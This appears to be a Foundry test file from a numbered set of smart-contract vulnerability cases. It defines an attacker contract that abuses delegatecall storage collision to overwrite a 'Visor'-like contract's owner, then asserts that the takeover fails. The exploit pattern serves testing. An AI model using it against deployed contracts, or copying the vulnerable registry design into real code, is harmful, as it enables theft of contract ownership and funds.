// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VisorLike} from "../src/16_VisorDelegatecall.sol";

/// Attacker contract whose storage layout matches the first slot of VisorLike
/// (slot 0 = owner). delegatecall'd into Visor's context overwrites Visor's
/// owner field.
contract Stealer {
    address public owner;

    function takeover(address newOwner) external {
        owner = newOwner;
    }
}

contract VisorDelegatecallTest is Test {
    function checkOwnerCannotBeStolenViaRegistry(address attacker) public {
        VisorLike v = new VisorLike();
        Stealer s = new Stealer();

        if (attacker == address(this) || attacker == address(0)) return;

        vm.prank(attacker);
        v.setImplementation(bytes32("evil"), address(s));

        vm.prank(attacker);
        v.execute(bytes32("evil"), abi.encodeCall(Stealer.takeover, (attacker)));

        // Soundness: an unauthorized caller should not be able to seize ownership.
        assert(v.owner() != attacker);
    }
}
